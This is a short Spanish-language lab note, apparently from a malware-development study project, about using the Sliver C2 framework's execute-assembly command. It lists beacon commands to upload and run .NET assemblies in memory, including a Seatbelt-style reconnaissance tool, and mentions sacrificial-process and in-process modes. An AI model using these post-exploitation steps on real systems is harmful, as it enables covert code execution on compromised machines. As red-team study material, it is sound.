Sliver sí soporta la ejecución de assemblies .NET a través de comandos como execute-assembly, que inyecta y carga código .NET en memoria (usando herramientas como Donut para generar shellcode).

```
use <ID>
```

```
sliver (BEACON) > upload HelloSliver.exe
```

```
sliver (BEACON) > execute-assembly HelloSliver.exe
```
dos modos

sacrificio y en el mismo proceso

```
execute-assembly --name seatbelt /home/llorens/projects/mal-dev-lab/101-code/dot-NET/RedTeam/bin/Release/net9.0/win-x64/publish/RedTeam.exe -group=All
```